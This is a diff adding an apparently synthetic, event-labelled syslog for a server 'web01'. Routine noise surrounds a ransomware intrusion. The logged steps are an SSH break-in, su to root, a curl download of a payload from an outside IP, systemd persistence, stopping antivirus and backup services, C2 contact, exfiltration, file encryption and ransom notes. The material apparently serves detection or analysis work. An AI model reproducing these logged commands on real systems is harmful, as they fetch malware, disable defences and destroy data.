@@ -1,0 +1,2200 @@
+Aug 20 00:47:00 web01 rsyslogd[574]: [origin software="rsyslogd" swVersion="8.2204.0"] start
+Aug 20 00:47:02 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:47:03 web01 systemd[1]: Started Rotate log files.
+Aug 20 00:47:05 web01 sshd[1473]: Server listening on 0.0.0.0 port 22.
+Aug 20 00:47:04 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:47:05 web01 avahi-daemon[666]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:47:12 web01 CRON[711]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:47:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:47:25 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:47:29 web01 postfix/smtpd[2779]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:47:32 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:47:37 web01 sshd[1294]: Accepted publickey for ubuntu from 10.0.4.17 port 57573 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:47:40 web01 dbus-daemon[1070]: systemd-logind: New session started
+Aug 20 00:47:42 web01 audit[329]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:47:44 web01 avahi-daemon[555]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:47:47 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:47:49 web01 postfix/smtpd[3336]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:47:55 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:48:01 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:48:06 web01 CRON[830]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:48:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:48:12 web01 avahi-daemon[566]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:48:17 web01 postfix/smtpd[2879]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:48:22 web01 systemd[1]: Rotate log files.
+Aug 20 00:48:28 web01 NetworkManager[1149]: DHCPv4 lease renewed on eth0
+Aug 20 00:48:35 web01 dbus-daemon[614]: systemd-logind: New session started
+Aug 20 00:48:38 web01 sshd[1490]: Failed password for invalid user user from 185.158.106.77 port 56403 ssh2 event=LOGIN_FAILED
+Aug 20 00:48:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:48:47 web01 dbus-daemon[656]: systemd-logind: New session started
+Aug 20 00:48:50 web01 sshd[1350]: Accepted publickey for ubuntu from 10.1.0.12 port 55310 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:48:51 web01 postfix/smtpd[3251]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:48:58 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:48:59 web01 avahi-daemon[739]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:49:04 web01 CRON[942]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:49:09 web01 sshd[1376]: Accepted publickey for deploy from 10.0.4.17 port 65219 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:49:16 web01 CRON[802]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:49:22 web01 sshd[1226]: Failed password for invalid user user from 89.248.165.114 port 43965 ssh2 event=LOGIN_FAILED
+Aug 20 00:49:24 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:49:29 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:49:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:49:32 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:49:34 web01 apt[3669]: Cache clean: removing index files
+Aug 20 00:49:39 web01 avahi-daemon[763]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:49:43 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:49:46 web01 sshd[1434]: Failed password for invalid user user from 45.155.23.87 port 62064 ssh2 event=LOGIN_FAILED
+Aug 20 00:49:52 web01 postfix/smtpd[2747]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:49:59 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:50:04 web01 sshd[1138]: Failed password for invalid user test from 89.248.165.114 port 48185 ssh2 event=LOGIN_FAILED
+Aug 20 00:50:08 web01 audit[307]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:50:14 web01 avahi-daemon[397]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:50:21 web01 CRON[823]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:50:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:50:27 web01 postfix/smtpd[3348]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:50:34 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:50:36 web01 CRON[848]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:50:42 web01 apt[2617]: Cache clean: removing index files
+Aug 20 00:50:43 web01 sshd[1141]: Accepted publickey for ubuntu from 10.0.5.23 port 58320 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:50:50 web01 systemd[1]: Rotate log files.
+Aug 20 00:50:54 web01 audit[2471]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:50:59 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:51:02 web01 NetworkManager[844]: DHCPv4 lease renewed on eth0
+Aug 20 00:51:05 web01 NetworkManager[907]: DHCPv4 lease renewed on eth0
+Aug 20 00:51:09 web01 apt[2648]: Cache clean: removing index files
+Aug 20 00:51:10 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:51:11 web01 sshd[1135]: Accepted publickey for ubuntu from 10.0.3.11 port 64432 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:51:13 web01 CRON[856]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:51:20 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:51:26 web01 audit[572]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:51:27 web01 CRON[854]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:51:29 web01 CRON[829]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:51:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:51:34 web01 avahi-daemon[372]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:51:35 web01 CRON[741]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:51:41 web01 NetworkManager[1174]: DHCPv4 lease renewed on eth0
+Aug 20 00:51:42 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:51:47 web01 postfix/smtpd[2965]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:51:49 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:51:56 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:51:58 web01 NetworkManager[962]: DHCPv4 lease renewed on eth0
+Aug 20 00:52:05 web01 audit[3169]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:52:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:52:14 web01 audit[834]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:52:20 web01 avahi-daemon[560]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:52:27 web01 apt[3008]: Cache clean: removing index files
+Aug 20 00:52:30 web01 NetworkManager[991]: DHCPv4 lease renewed on eth0
+Aug 20 00:52:37 web01 sshd[1256]: Failed password for invalid user admin from 89.248.165.114 port 51457 ssh2 event=LOGIN_FAILED
+Aug 20 00:52:44 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:52:50 web01 nginx[2571]: 200 0.171 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 00:52:53 web01 postfix/smtpd[3263]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:52:58 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:53:00 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:53:01 web01 nginx[2893]: 200 0.421 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 00:53:06 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:53:09 web01 sshd[1468]: Failed password for invalid user user from 185.220.101.17 port 62506 ssh2 event=LOGIN_FAILED
+Aug 20 00:53:15 web01 CRON[717]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:53:21 web01 dbus-daemon[1179]: systemd-logind: New session started
+Aug 20 00:53:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:53:34 web01 postfix/smtpd[2702]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:53:39 web01 sshd[1391]: Failed password for invalid user test from 185.92.220.41 port 60169 ssh2 event=LOGIN_FAILED
+Aug 20 00:53:42 web01 avahi-daemon[505]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:53:45 web01 avahi-daemon[660]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:53:51 web01 sshd[1342]: Failed password for invalid user user from 185.92.220.41 port 56750 ssh2 event=LOGIN_FAILED
+Aug 20 00:53:58 web01 avahi-daemon[436]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:54:04 web01 sshd[1484]: Accepted publickey for deploy from 10.0.5.23 port 63409 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:54:06 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:54:08 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:54:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:54:19 web01 NetworkManager[993]: DHCPv4 lease renewed on eth0
+Aug 20 00:54:23 web01 CRON[928]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:54:30 web01 audit[1841]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:54:32 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:54:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:54:37 web01 sshd[1262]: Failed password for invalid user user from 185.220.101.17 port 59511 ssh2 event=LOGIN_FAILED
+Aug 20 00:54:44 web01 dbus-daemon[1236]: systemd-logind: New session started
+Aug 20 00:54:49 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:54:51 web01 sshd[1241]: Failed password for invalid user test from 185.92.220.41 port 60894 ssh2 event=LOGIN_FAILED
+Aug 20 00:54:58 web01 sshd[1139]: Failed password for invalid user admin from 185.158.106.77 port 54413 ssh2 event=LOGIN_FAILED
+Aug 20 00:55:04 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:55:09 web01 CRON[877]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:55:11 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:55:14 web01 postfix/smtpd[2611]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:55:21 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:55:28 web01 systemd[1]: Rotate log files.
+Aug 20 00:55:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:55:36 web01 avahi-daemon[625]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:55:42 web01 avahi-daemon[462]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:55:46 web01 sshd[1442]: Failed password for invalid user admin from 89.248.165.114 port 51014 ssh2 event=LOGIN_FAILED
+Aug 20 00:55:52 web01 apt[3457]: Cache clean: removing index files
+Aug 20 00:55:54 web01 sshd[1439]: Accepted publickey for deploy from 10.1.0.12 port 59246 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:55:55 web01 sshd[1233]: Failed password for invalid user test from 185.92.220.41 port 41647 ssh2 event=LOGIN_FAILED
+Aug 20 00:55:59 web01 sshd[1485]: Failed password for invalid user test from 89.248.165.114 port 49117 ssh2 event=LOGIN_FAILED
+Aug 20 00:56:06 web01 avahi-daemon[590]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:56:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:56:09 web01 avahi-daemon[683]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:56:10 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:56:17 web01 CRON[821]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:56:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:56:29 web01 postfix/smtpd[3020]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 00:56:34 web01 NetworkManager[767]: DHCPv4 lease renewed on eth0
+Aug 20 00:56:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:56:42 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:56:48 web01 systemd[1]: Rotate log files.
+Aug 20 00:56:49 web01 nginx[2247]: 200 0.800 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 00:56:56 web01 avahi-daemon[527]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:57:00 web01 sshd[1157]: Failed password for invalid user admin from 45.155.23.87 port 60952 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:02 web01 sshd[1479]: Failed password for invalid user test from 45.155.23.87 port 40819 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:03 web01 sshd[1225]: Failed password for root from 45.155.23.87 port 49012 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:57:06 web01 avahi-daemon[404]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:57:10 web01 dbus-daemon[1348]: systemd-logind: New session started
+Aug 20 00:57:14 web01 sshd[1238]: Failed password for invalid user user from 185.220.101.17 port 61314 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:19 web01 sshd[1474]: Accepted publickey for deploy from 10.0.5.44 port 57136 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:57:24 web01 audit[3928]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 00:57:25 web01 sshd[1442]: Failed password for invalid user test from 185.220.101.17 port 59999 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:29 web01 sshd[1208]: Failed password for invalid user test from 185.92.220.41 port 55976 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:32 web01 nginx[2565]: 200 0.710 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 00:57:37 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:57:39 web01 sshd[1464]: Failed password for invalid user admin from 89.248.165.114 port 61164 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:43 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:57:45 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:57:49 web01 nginx[3127]: 200 0.863 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 00:57:52 web01 sshd[1161]: Failed password for invalid user test from 185.158.106.77 port 47554 ssh2 event=LOGIN_FAILED
+Aug 20 00:57:58 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:58:00 web01 sshd[1368]: Failed password for invalid user user from 185.220.101.17 port 64910 ssh2 event=LOGIN_FAILED
+Aug 20 00:58:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:58:08 web01 CRON[881]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:58:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:58:18 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:58:19 web01 systemd[1]: Rotate log files.
+Aug 20 00:58:23 web01 CRON[764]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:58:30 web01 avahi-daemon[555]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:58:34 web01 dbus-daemon[554]: systemd-logind: New session started
+Aug 20 00:58:36 web01 systemd[1]: Rotate log files.
+Aug 20 00:58:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:58:42 web01 dbus-daemon[1294]: systemd-logind: New session started
+Aug 20 00:58:47 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:58:54 web01 sshd[1412]: Failed password for invalid user user from 185.220.101.17 port 41973 ssh2 event=LOGIN_FAILED
+Aug 20 00:59:00 web01 apt[3781]: Cache clean: removing index files
+Aug 20 00:59:02 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 00:59:04 web01 CRON[815]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 00:59:10 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:59:11 web01 sshd[1171]: Accepted password for svc.backup from 185.92.220.41 port 42828 ssh2 event=LOGIN_SUCCESS
+Aug 20 00:59:12 web01 sshd[1477]: pam_unix(sshd:session): session opened for user svc.backup(uid=1002) by (uid=0)
+Aug 20 00:59:13 web01 systemd-logind[519]: New session 23 of user svc.backup.
+Aug 20 00:59:19 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 00:59:20 web01 NetworkManager[870]: DHCPv4 lease renewed on eth0
+Aug 20 00:59:27 web01 avahi-daemon[651]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 00:59:31 web01 sudo[2871]: svc.backup : TTY=pts/0 ; PWD=/home/svc.backup ; USER=root ; COMMAND=/bin/su - event=PRIV_ESCALATION
+Aug 20 00:59:31 web01 sudo[3133]: pam_unix(sudo:session): session opened for user root by svc.backup(uid=1002)
+Aug 20 00:59:40 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 00:59:41 web01 systemd[1]: Rotate log files.
+Aug 20 00:59:42 web01 audit[3754]: user=root exe="/usr/bin/curl" args="--silent http://185.158.106.77/update.bin" event=DOWNLOAD hash=unknown
+Aug 20 00:59:44 web01 audit[2333]: user=root exe="/usr/bin/chmod" args="+x /tmp/.cache/kworkerd" event=PERMISSION_CHANGE
+Aug 20 00:59:45 web01 systemd[1]: Created slice kworkerd.service event=PERSISTENCE
+Aug 20 00:59:46 web01 systemd[1]: Started kworkerd.service (autostart on boot) event=PERSISTENCE path=/etc/systemd/system/kworkerd.service
+Aug 20 00:59:47 web01 kworkerd[230]: starting payload mode=stage1 event=EXECUTE hash=da39a3ee5e6b4b0d3255bfef95601890afd80709
+Aug 20 00:59:53 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:00:00 web01 nginx[3165]: 200 0.866 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:00:03 web01 sshd[1306]: Failed password for invalid user test from 185.158.106.77 port 62928 ssh2 event=LOGIN_FAILED
+Aug 20 01:00:06 web01 sshd[1406]: Accepted publickey for deploy from 10.0.5.44 port 51317 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:00:07 web01 audit[1420]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:00:11 web01 audit[222]: user=root exe="/usr/bin/systemctl" args="stop clamd.service" event=DEFENSE_EVASION target=clamd.service
+Aug 20 01:00:12 web01 audit[483]: user=root exe="/usr/bin/systemctl" args="disable clamd.service" event=DEFENSE_EVASION target=clamd.service
+Aug 20 01:00:17 web01 kworkerd[995]: contacting c2 host=185.158.106.77 port=443 proto=https event=C2_CONNECT status=ok
+Aug 20 01:00:20 web01 kworkerd[1052]: discovery event=HOST_ENUM uname="Linux web01 5.15.0-92-generic"
+Aug 20 01:00:29 web01 kworkerd[2169]: credential access event=SHADOW_READ status=denied
+Aug 20 01:00:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:00:21 web01 avahi-daemon[644]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:00:26 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:00:31 web01 smbd[2565]: Authentication for user 'svc.backup' from 10.0.5.23 succeeded share=IPC$ event=LATERAL_MOVE
+Aug 20 01:00:32 web01 apt[2858]: Cache clean: removing index files
+Aug 20 01:00:36 web01 sshd[1399]: Accepted publickey for deploy from 10.0.3.11 port 52973 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:00:40 web01 dbus-daemon[1003]: systemd-logind: New session started
+Aug 20 01:00:41 web01 sshd[1443]: Failed password for invalid user test from 185.158.106.77 port 50520 ssh2 event=LOGIN_FAILED
+Aug 20 01:00:42 web01 audit[1786]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:00:48 web01 sshd[1381]: Failed password for invalid user user from 89.248.165.114 port 64920 ssh2 event=LOGIN_FAILED
+Aug 20 01:00:49 web01 sshd[1159]: Failed password for invalid user test from 185.158.106.77 port 50593 ssh2 event=LOGIN_FAILED
+Aug 20 01:00:52 web01 sshd[1387]: Accepted publickey for root from 10.0.5.23 port 50434 ssh2 event=EAST_WEST
+Aug 20 01:01:00 web01 audit[104]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:01:02 web01 audit[914]: user=root exe="/usr/bin/iptables" args="-I OUTPUT -p tcp --dport 443 -d 185.158.106.77 -j ACCEPT" event=FIREWALL_MOD
+Aug 20 01:01:13 web01 systemd[1]: Rotate log files.
+Aug 20 01:01:14 web01 CRON[859]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:01:16 web01 kworkerd[3032]: staging files event=STAGE dir=/var/tmp/.cache size=2.1GB count=1523
+Aug 20 01:01:25 web01 dbus-daemon[1278]: systemd-logind: New session started
+Aug 20 01:01:26 web01 CRON[937]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:01:29 web01 sshd[1114]: Failed password for invalid user user from 89.248.165.114 port 43978 ssh2 event=LOGIN_FAILED
+Aug 20 01:01:31 web01 kworkerd[2761]: exfil attempt host=185.158.106.77 size=41.3MB status=partial event=EXFIL
+Aug 20 01:01:40 web01 avahi-daemon[713]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:01:42 web01 nginx[3131]: 200 0.114 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:01:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:01:50 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:01:54 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:01:59 web01 NetworkManager[1025]: DHCPv4 lease renewed on eth0
+Aug 20 01:02:06 web01 sshd[1382]: Failed password for invalid user test from 185.92.220.41 port 54967 ssh2 event=LOGIN_FAILED
+Aug 20 01:02:08 web01 postfix/smtpd[3343]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:02:13 web01 sshd[1495]: Accepted publickey for ubuntu from 10.0.5.23 port 54526 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:02:15 web01 audit[2972]: user=root exe="/usr/bin/systemctl" args="stop backup-agent.service" event=DEFENSE_EVASION target=backup-agent.service
+Aug 20 01:02:20 web01 audit[2332]: user=root exe="/usr/bin/systemctl" args="mask backup-agent.service" event=DEFENSE_EVASION target=backup-agent.service
+Aug 20 01:02:27 web01 postfix/smtpd[3356]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:02:34 web01 sshd[1252]: Accepted publickey for ubuntu from 10.0.3.11 port 61895 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:02:41 web01 kworkerd[1818]: starting encryption scope=/home,/var/www speed=fast event=ENCRYPTION_BEGIN
+Aug 20 01:02:42 web01 kernel[0]: inotify: rename /home/alex/Documents/budget.xlsx -> /home/alex/Documents/budget.xlsx.locked event=FILE_RENAME
+Aug 20 01:02:43 web01 kernel[0]: inotify: rename /home/alex/Pictures/family.jpg -> /home/alex/Pictures/family.jpg.locked event=FILE_RENAME
+Aug 20 01:02:44 web01 kworkerd[2513]: progress encrypted=1025 files rate=814 fpm event=ENCRYPTION_PROGRESS
+Aug 20 01:02:44 web01 kernel[0]: inotify: rename /var/www/html/index.php -> /var/www/html/index.php.locked event=FILE_RENAME
+Aug 20 01:02:45 web01 kernel[0]: inotify: rename /var/www/html/uploads/report.pdf -> /var/www/html/uploads/report.pdf.locked event=FILE_RENAME
+Aug 20 01:02:46 web01 kernel[0]: inotify: rename /home/alex/Notes/todo.txt -> /home/alex/Notes/todo.txt.locked event=FILE_RENAME
+Aug 20 01:02:47 web01 kworkerd[3208]: progress encrypted=1084 files rate=701 fpm event=ENCRYPTION_PROGRESS
+Aug 20 01:02:47 web01 kernel[0]: inotify: rename /var/lib/mysql/db.ibd -> /var/lib/mysql/db.ibd.locked event=FILE_RENAME
+Aug 20 01:02:49 web01 sshd[1382]: Failed password for invalid user test from 185.158.106.77 port 50893 ssh2 event=LOGIN_FAILED
+Aug 20 01:02:51 web01 kworkerd[3400]: dropped note path=/home/alex/README_RECOVER_FILES.txt event=RANSOM_NOTE
+Aug 20 01:02:52 web01 kworkerd[753]: dropped note path=/var/www/README_RECOVER_FILES.txt event=RANSOM_NOTE
+Aug 20 01:02:56 web01 audit[1078]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:02:58 web01 audit[278]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:02:59 web01 kworkerd[2959]: encryption complete encrypted=23177 files duration=00:00:18 event=ENCRYPTION_DONE
+Aug 20 01:03:02 web01 sshd[1316]: Received disconnect from 185.92.220.41: 11: disconnected by user
+Aug 20 01:03:03 web01 sshd[1274]: pam_unix(sshd:session): session closed for user svc.backup
+Aug 20 01:03:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:03:07 web01 systemd[1]: Stopping rsyslog.service...
+Aug 20 01:03:09 web01 rsyslogd[459]: rsyslogd was HUPed event=LOG_TAMPER attempt=rotate_mid_encryption
+Aug 20 01:03:15 web01 kernel[0]: EXT4-fs (sda1): re-mounted read-only by PID 1799 event=IMPACT
+Aug 20 01:03:31 web01 backup-agent[3227]: failed integrity check: numerous .locked files event=DETECTION
+Aug 20 01:03:25 web01 avahi-daemon[427]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:03:29 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:03:34 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:03:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:03:42 web01 sshd[1173]: Accepted publickey for deploy from 10.0.5.23 port 61836 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:03:46 web01 audit[406]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:03:50 web01 avahi-daemon[485]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:03:53 web01 dbus-daemon[907]: systemd-logind: New session started
+Aug 20 01:03:59 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:04:06 web01 NetworkManager[1146]: DHCPv4 lease renewed on eth0
+Aug 20 01:04:10 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:04:17 web01 systemd[1]: Rotate log files.
+Aug 20 01:04:19 web01 dbus-daemon[1443]: systemd-logind: New session started
+Aug 20 01:04:22 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:04:26 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:04:30 web01 CRON[931]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:04:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:04:34 web01 nginx[2298]: 200 0.541 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:04:36 web01 sshd[1140]: Accepted publickey for ubuntu from 10.0.4.17 port 52868 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:04:41 web01 audit[2898]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:04:43 web01 sshd[1336]: Failed password for invalid user user from 185.92.220.41 port 47608 ssh2 event=LOGIN_FAILED
+Aug 20 01:04:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:04:55 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:04:58 web01 NetworkManager[761]: DHCPv4 lease renewed on eth0
+Aug 20 01:04:59 web01 sshd[1427]: Failed password for invalid user test from 185.220.101.17 port 49802 ssh2 event=LOGIN_FAILED
